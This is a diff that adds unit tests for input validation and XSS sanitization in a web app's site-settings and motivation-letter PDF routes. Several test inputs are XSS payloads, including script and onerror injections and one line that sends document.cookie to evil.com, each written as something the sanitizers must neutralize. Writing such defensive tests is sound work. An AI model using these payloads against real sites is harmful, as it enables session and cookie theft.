@@ -261,6 +261,161 @@ describe('HTML Sanitization for PDF', () => {
   });
 });
 
+describe('Site Settings Input Validation', () => {
+  // Replicate validation from site-settings/route.ts
+  const EMAIL_REGEX = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+  const MAX_EMAIL_LENGTH = 254;
+  const MAX_PHONE_LENGTH = 50;
+  const MAX_ADDRESS_LENGTH = 500;
+
+  const isValidEmail = (email: string): boolean => {
+    return email.length <= MAX_EMAIL_LENGTH && EMAIL_REGEX.test(email);
+  };
+
+  const sanitizeText = (text: string): string => {
+    return text.replace(/<[^>]*>/g, '').trim();
+  };
+
+  describe('email validation', () => {
+    it('should accept valid email addresses', () => {
+      expect(isValidEmail('test@example.com')).toBe(true);
+      expect(isValidEmail('user.name@domain.co.uk')).toBe(true);
+      expect(isValidEmail('user+tag@example.org')).toBe(true);
+    });
+
+    it('should reject invalid email addresses', () => {
+      expect(isValidEmail('invalid')).toBe(false);
+      expect(isValidEmail('missing@domain')).toBe(false);
+      expect(isValidEmail('@nodomain.com')).toBe(false);
+      expect(isValidEmail('spaces in@email.com')).toBe(false);
+    });
+
+    it('should reject emails exceeding max length', () => {
+      const longEmail = 'a'.repeat(250) + '@test.com';
+      expect(isValidEmail(longEmail)).toBe(false);
+    });
+
+    it('should accept emails at max length', () => {
+      const localPart = 'a'.repeat(240);
+      const email = `${localPart}@test.com`;
+      expect(email.length).toBeLessThanOrEqual(MAX_EMAIL_LENGTH);
+      expect(isValidEmail(email)).toBe(true);
+    });
+  });
+
+  describe('text sanitization (XSS prevention)', () => {
+    it('should remove HTML tags', () => {
+      expect(sanitizeText('<script>alert(1)</script>')).toBe('alert(1)');
+      expect(sanitizeText('<b>bold</b>')).toBe('bold');
+      expect(sanitizeText('<a href="evil">link</a>')).toBe('link');
+    });
+
+    it('should remove nested HTML tags', () => {
+      expect(sanitizeText('<div><span>text</span></div>')).toBe('text');
+    });
+
+    it('should handle self-closing tags', () => {
+      expect(sanitizeText('<br/>')).toBe('');
+      expect(sanitizeText('<img src="x" onerror="alert(1)"/>')).toBe('');
+    });
+
+    it('should preserve plain text', () => {
+      expect(sanitizeText('Plain text')).toBe('Plain text');
+      expect(sanitizeText('123 Main St, City')).toBe('123 Main St, City');
+    });
+
+    it('should trim whitespace', () => {
+      expect(sanitizeText('  text  ')).toBe('text');
+    });
+
+    it('should handle empty and null-like inputs', () => {
+      expect(sanitizeText('')).toBe('');
+      expect(sanitizeText('   ')).toBe('');
+    });
+  });
+
+  describe('length limits', () => {
+    it('should have reasonable max phone length', () => {
+      expect(MAX_PHONE_LENGTH).toBe(50);
+      // International phone numbers with extensions can be long
+      expect('+1 (555) 123-4567 ext. 12345'.length).toBeLessThan(MAX_PHONE_LENGTH);
+    });
+
+    it('should have reasonable max address length', () => {
+      expect(MAX_ADDRESS_LENGTH).toBe(500);
+      // Should accommodate multi-line addresses
+    });
+  });
+});
+
+describe('Motivation Letter PDF Sanitization', () => {
+  // Replicate sanitization from generate-motivation-letter-pdf/route.ts
+  const sanitizeText = (text: string): string => {
+    return text
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#39;');
+  };
+
+  describe('HTML entity encoding', () => {
+    it('should encode less than signs', () => {
+      expect(sanitizeText('<script>')).toBe('&lt;script&gt;');
+    });
+
+    it('should encode greater than signs', () => {
+      expect(sanitizeText('1 > 0')).toBe('1 &gt; 0');
+    });
+
+    it('should encode double quotes', () => {
+      expect(sanitizeText('He said "hello"')).toBe('He said &quot;hello&quot;');
+    });
+
+    it('should encode single quotes', () => {
+      expect(sanitizeText("It's fine")).toBe('It&#39;s fine');
+    });
+
+    it('should encode all special characters together', () => {
+      const input = '<div onclick="alert(\'xss\')">';
+      const expected = '&lt;div onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;';
+      expect(sanitizeText(input)).toBe(expected);
+    });
+  });
+
+  describe('safe content preservation', () => {
+    it('should preserve normal text', () => {
+      const text = 'I am writing to express my interest in the position.';
+      // The text doesn't have any special chars so it remains the same
+      expect(sanitizeText(text)).toBe(text);
+    });
+
+    it('should preserve newlines and whitespace', () => {
+      const text = 'Line 1\nLine 2\n\nLine 3';
+      expect(sanitizeText(text)).toBe(text);
+    });
+
+    it('should handle empty strings', () => {
+      expect(sanitizeText('')).toBe('');
+    });
+  });
+
+  describe('XSS prevention in PDF context', () => {
+    it('should neutralize script injection attempts', () => {
+      const malicious = '<script>document.location="http://evil.com?c="+document.cookie</script>';
+      const result = sanitizeText(malicious);
+      expect(result).not.toContain('<script>');
+      expect(result).toContain('&lt;script&gt;');
+    });
+
+    it('should neutralize event handler injection', () => {
+      const malicious = '<img src=x onerror="alert(1)">';
+      const result = sanitizeText(malicious);
+      expect(result).not.toContain('<img');
+      expect(result).toContain('&lt;img');
+    });
+  });
+});
+
 describe('PDF Attachment Path Validation', () => {
   // Replicate the validation function from generate-pdf/route.ts
   const ALLOWED_ATTACHMENT_PATHS = [
